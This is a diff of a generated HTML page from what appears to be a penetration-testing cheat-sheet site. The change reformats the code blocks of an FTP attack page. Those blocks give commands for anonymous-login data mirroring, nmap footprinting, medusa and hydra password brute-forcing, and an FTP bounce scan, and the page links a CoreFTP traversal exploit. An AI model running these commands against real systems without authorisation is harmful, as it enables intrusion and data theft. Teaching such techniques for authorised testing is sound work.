@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17372,105 +17395,161 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>A distinction is made between <code>active</code> and <code>passive</code> FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the <code>passive mode</code> has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.</p>
 <h2 id="installation">Installation</h2>
 <p>You may need to install ftp service. Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>ftp<span class="w"> </span>-y
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>ftp<span class="w"> </span>-y
+</span></code></pre></div></td></tr></table></div>
 <p>Then to connect with ftp, run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>ftp<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>The prompt will ask us for the username we want to log in with. Here is where the magic happens. A typical misconfiguration for running FTP services allows an anonymous account to access the service like any other authenticated user. The anonymous username can be input when the prompt appears, followed by any password whatsoever since the service will disregard the password for this specific account.</p>
 <h2 id="basic-usage">Basic usage</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># Connect with ftp
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ftp $ip
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># If anonymous login is allowed, enter anonymous as user and press Enter when prompted for password
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a># Give you a list of available commands
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>help
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a># List directories and files
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>ls
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a># List recursively. Not always available, only in some configurations
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>ls -R
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a># Change to a directory
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>cd &lt;folder&gt;
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
-</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a># Download a file to your localhost
-</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>get &lt;nameofFileInOrigin&gt; &lt;nameOfFileInLocalhost&gt;
-</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
-</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a># Download multiple files to your localhost
-</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>mget *.* &lt;nameOfFileInLocalhost&gt;
-</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
-</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a># Upload a file from your localhost
-</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>put &lt;yourfile&gt;
-</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
-</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a># Upload multiple files from your localhost
-</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>mput *.*
-</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>
-</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a># Exit connection
-</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>quit
-</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>
-</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a># Connect in passive mode
-</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>ftp -p $ip
-</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a># The `-p` flag in the `ftp` command on Linux is used to enable passive mode for the file transfer protocol (FTP) connection. Passive mode is a mode of FTP where the data connection is initiated by the client rather than the server. This can be useful when the client is behind a firewall or NAT (Network Address Translation) that does not allow incoming connections. 
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span>
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span>
+<span class="normal"><a href="#__codelineno-2-29">29</a></span>
+<span class="normal"><a href="#__codelineno-2-30">30</a></span>
+<span class="normal"><a href="#__codelineno-2-31">31</a></span>
+<span class="normal"><a href="#__codelineno-2-32">32</a></span>
+<span class="normal"><a href="#__codelineno-2-33">33</a></span>
+<span class="normal"><a href="#__codelineno-2-34">34</a></span>
+<span class="normal"><a href="#__codelineno-2-35">35</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a># Connect with ftp
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>ftp $ip
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a># If anonymous login is allowed, enter anonymous as user and press Enter when prompted for password
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a># Give you a list of available commands
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>help
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a># List directories and files
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>ls
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a># List recursively. Not always available, only in some configurations
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>ls -R
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a># Change to a directory
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>cd &lt;folder&gt;
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a># Download a file to your localhost
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19"></a>get &lt;nameofFileInOrigin&gt; &lt;nameOfFileInLocalhost&gt;
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20"></a>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21"></a># Download multiple files to your localhost
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22"></a>mget *.* &lt;nameOfFileInLocalhost&gt;
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23"></a>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24"></a># Upload a file from your localhost
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a>put &lt;yourfile&gt;
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27"></a># Upload multiple files from your localhost
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28"></a>mput *.*
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29"></a>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30"></a># Exit connection
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31"></a>quit
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32"></a>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33"></a># Connect in passive mode
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34"></a>ftp -p $ip
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35"></a># The `-p` flag in the `ftp` command on Linux is used to enable passive mode for the file transfer protocol (FTP) connection. Passive mode is a mode of FTP where the data connection is initiated by the client rather than the server. This can be useful when the client is behind a firewall or NAT (Network Address Translation) that does not allow incoming connections. 
+</span></code></pre></div></td></tr></table></div>
 <p>More posibilities with wget:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Download all available files at once
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>wget -m --no-passive ftp://anonymous:anonymous@$ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a># Download all available files at once
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>wget -m --no-passive ftp://anonymous:anonymous@$ip
+</span></code></pre></div></td></tr></table></div>
 <h2 id="footprinting-with-nmap">Footprinting with nmap</h2>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="gp"># </span>Locate<span class="w"> </span>all<span class="w"> </span>ftp<span class="w"> </span>scripts<span class="w"> </span>related
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="go">find / -type f -name ftp* 2&gt;/dev/null | grep scripts</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="gp"># </span>Run<span class="w"> </span>a<span class="w"> </span>general<span class="w"> </span>scanner<span class="w"> </span><span class="k">for</span><span class="w"> </span>version,<span class="w"> </span>mode<span class="w"> </span>aggresive<span class="w"> </span>and<span class="w"> </span>perform<span class="w"> </span>default<span class="w"> </span>scripts
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="go">sudo nmap -sV -p21 -sC -A $ip --script-trace</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="gp"># </span>--script-trace<span class="w"> </span>&gt;<span class="w"> </span>trace<span class="w"> </span>the<span class="w"> </span>progress<span class="w"> </span>of<span class="w"> </span>NSE<span class="w"> </span>scripts<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>network<span class="w"> </span>level
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="gp"># </span>-sV<span class="w"> </span>&gt;<span class="w"> </span>version<span class="w"> </span>scan<span class="w"> </span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="gp"># </span>-A<span class="w"> </span>&gt;<span class="w"> </span>aggressive<span class="w"> </span>scan<span class="w"> </span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="gp"># </span>-sC<span class="w"> </span>&gt;<span class="w"> </span>the<span class="w"> </span>default<span class="w"> </span>script<span class="w"> </span>scan
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span>
+<span class="normal"><a href="#__codelineno-4-7">7</a></span>
+<span class="normal"><a href="#__codelineno-4-8">8</a></span>
+<span class="normal"><a href="#__codelineno-4-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="gp"># </span>Locate<span class="w"> </span>all<span class="w"> </span>ftp<span class="w"> </span>scripts<span class="w"> </span>related
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="go">find / -type f -name ftp* 2&gt;/dev/null | grep scripts</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="gp"># </span>Run<span class="w"> </span>a<span class="w"> </span>general<span class="w"> </span>scanner<span class="w"> </span><span class="k">for</span><span class="w"> </span>version,<span class="w"> </span>mode<span class="w"> </span>aggresive<span class="w"> </span>and<span class="w"> </span>perform<span class="w"> </span>default<span class="w"> </span>scripts
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="go">sudo nmap -sV -p21 -sC -A $ip --script-trace</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="gp"># </span>--script-trace<span class="w"> </span>&gt;<span class="w"> </span>trace<span class="w"> </span>the<span class="w"> </span>progress<span class="w"> </span>of<span class="w"> </span>NSE<span class="w"> </span>scripts<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>network<span class="w"> </span>level
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="gp"># </span>-sV<span class="w"> </span>&gt;<span class="w"> </span>version<span class="w"> </span>scan<span class="w"> </span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="gp"># </span>-A<span class="w"> </span>&gt;<span class="w"> </span>aggressive<span class="w"> </span>scan<span class="w"> </span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="gp"># </span>-sC<span class="w"> </span>&gt;<span class="w"> </span>the<span class="w"> </span>default<span class="w"> </span>script<span class="w"> </span>scan
+</span></code></pre></div></td></tr></table></div>
 <p>Some nmap scripts related to ftp:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># ftp-anon NSE script checks whether the FTP server allows anonymous access.
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a># ftp-syst, for example, executes the `STAT` command, which displays information about the FTP server status.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a># ftp-anon NSE script checks whether the FTP server allows anonymous access.
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a># ftp-syst, for example, executes the `STAT` command, which displays information about the FTP server status.
+</span></code></pre></div></td></tr></table></div>
 <p><a href="../nmap/">See more about nmap for scanning, running scripts and footprinting</a> </p>
 <h2 id="interact-with-the-service">Interact with the service</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc -nv $ip 21
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>telnet $ip 21
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>openssl s_client -connect $ip:21 -starttls ftp
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>nc -nv $ip 21
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>telnet $ip 21
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>openssl s_client -connect $ip:21 -starttls ftp
+</span></code></pre></div></td></tr></table></div>
 <h2 id="attacking-ftp">Attacking FTP</h2>
 <h3 id="anonymous-access-enabled">Anonymous access enabled</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># Download all available files at once
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>wget -m --no-passive ftp://anonymous:anonymous@$ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a># Download all available files at once
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>wget -m --no-passive ftp://anonymous:anonymous@$ip
+</span></code></pre></div></td></tr></table></div>
 <h3 id="brute-forcing-with-medusa">Brute forcing with Medusa</h3>
 <p><a href="../medusa/">Medusa Cheat sheet</a>. </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Brute force FTP logging</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>medusa<span class="w"> </span>-u<span class="w"> </span>fiona<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-M<span class="w"> </span>ftp
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># -u: username</span>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># -U: list of Usernames</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># -p: password</span>
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># -P: list of passwords</span>
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># -h: host /IP</span>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># -M: protocol to bruteforce</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span>
+<span class="normal"><a href="#__codelineno-8-6">6</a></span>
+<span class="normal"><a href="#__codelineno-8-7">7</a></span>
+<span class="normal"><a href="#__codelineno-8-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c1"># Brute force FTP logging</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>medusa<span class="w"> </span>-u<span class="w"> </span>fiona<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-h<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-M<span class="w"> </span>ftp
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="c1"># -u: username</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c1"># -U: list of Usernames</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="c1"># -p: password</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="c1"># -P: list of passwords</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="c1"># -h: host /IP</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="c1"># -M: protocol to bruteforce</span>
+</span></code></pre></div></td></tr></table></div>
 <p>However Medusa is very slow in comparison to <a href="../hydra/">hydra</a>:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># Example for ftp in a non default port
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>hydra -L users.txt -P pass.txt ftp://$ip:2121
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a># Example for ftp in a non default port
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>hydra -L users.txt -P pass.txt ftp://$ip:2121
+</span></code></pre></div></td></tr></table></div>
 <h3 id="ftp-bounce-attack">FTP Bounce Attack</h3>
 <p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server <code>FTP_DMZ</code> exposed to the internet. Another device within the same network, <code>Internal_DMZ</code>, is not exposed to the internet. We can use the connection to the <code>FTP_DMZ</code> server to scan <code>Internal_DMZ</code> using the FTP Bounce attack and obtain information about the server's open ports.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="go">nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="gp"># </span>-b<span class="w"> </span>The<span class="w"> </span><span class="sb">`</span>Nmap<span class="sb">`</span><span class="w"> </span>-b<span class="w"> </span>flag<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>an<span class="w"> </span>FTP<span class="w"> </span>bounce<span class="w"> </span>attack:<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="go">nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="gp"># </span>-b<span class="w"> </span>The<span class="w"> </span><span class="sb">`</span>Nmap<span class="sb">`</span><span class="w"> </span>-b<span class="w"> </span>flag<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>an<span class="w"> </span>FTP<span class="w"> </span>bounce<span class="w"> </span>attack:<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="coreftp-server-build-725-directory-traversal-authenticated">CoreFTP Server build 725 - Directory Traversal (Authenticated)</h3>
 <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22836">CVE-2022-22836</a> |   <a href="https://www.exploit-db.com/exploits/50652">exploit</a></p>
